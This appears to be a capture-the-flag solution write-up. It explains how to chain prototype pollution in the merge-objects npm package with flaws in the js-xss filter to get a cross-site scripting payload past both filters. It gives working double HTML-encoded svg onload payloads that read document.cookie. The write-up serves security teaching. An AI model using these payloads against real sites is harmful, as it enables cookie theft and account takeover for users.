# Solution
The intended solution involves chaining together the following three vulnerabilies from two different npm packages, roughly in this order:
    1. `merge-objects` prototype pollution: https://npmjs.com/advisories/716
    2. `xss` prototype pollution to XSS: https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/js-xss.md
    3. `xss` failing to re-escape whitelisted attribute values: https://github.com/leizongmin/js-xss/issues/180

When used in conjunction, these vulnerabilies allow you to construct a payload that bypasses the XSS filter as well as the blacklist filter.
The purpose of the blacklist filter (`sanitized.replace(/C/g, '\u0421').replace(/c/g, '\u0441')`) is to make it so players have to take advantage of the fact that the XSS filter does not re-escape attribute values if they want to access `document.cookie`.
As an example, the payload: 
`<svg onload="alert(document.cookie)">` 
would easily be caught by the blacklist filter. HTML encoding the JavaScript portion once would give you
`<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;>`
which would still be caught as it would revert to
`<svg onload="alert(document.cookie)">` 
once it is un-escaped by the XSS filter. HTML encoding the JavaScript portion of the payload twice works because 
`<svg onload=&#38;&#35;&#57;&#55;&#59;&#38;&#35;&#49;&#48;&#56;&#59;&#38;&#35;&#49;&#48;&#49;&#59;&#38;&#35;&#49;&#49;&#52;&#59;&#38;&#35;&#49;&#49;&#54;&#59;&#38;&#35;&#52;&#48;&#59;&#38;&#35;&#49;&#48;&#48;&#59;&#38;&#35;&#49;&#49;&#49;&#59;&#38;&#35;&#57;&#57;&#59;&#38;&#35;&#49;&#49;&#55;&#59;&#38;&#35;&#49;&#48;&#57;&#59;&#38;&#35;&#49;&#48;&#49;&#59;&#38;&#35;&#49;&#49;&#48;&#59;&#38;&#35;&#49;&#49;&#54;&#59;&#38;&#35;&#52;&#54;&#59;&#38;&#35;&#57;&#57;&#59;&#38;&#35;&#49;&#49;&#49;&#59;&#38;&#35;&#49;&#49;&#49;&#59;&#38;&#35;&#49;&#48;&#55;&#59;&#38;&#35;&#49;&#48;&#53;&#59;&#38;&#35;&#49;&#48;&#49;&#59;&#38;&#35;&#52;&#49;&#59;>`
becomes 
`<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;&#41;>`
after passing through the XSS filter. This payload will all make it past the blacklist filter and be served as a webpage to the hero, which un-escapes it an additional time and interprets it as
`<svg onload="alert(document.cookie)">` as intended. 
The blacklist filter also forces players to use a somewhat more rare XSS payload that doesn't directly contain a "c", as a lot of the most common ones do (e.g. `<s**c**ript sr**c**=...`, `<img sr**c**=...`, `<iframe sr**c**=...`, etc.).

Additonally, here is a list of XSS payloads that I used to find one that can be triggered without using a "c": https://gist.github.com/phra/76518994c908ac836ec5a393f188f89a
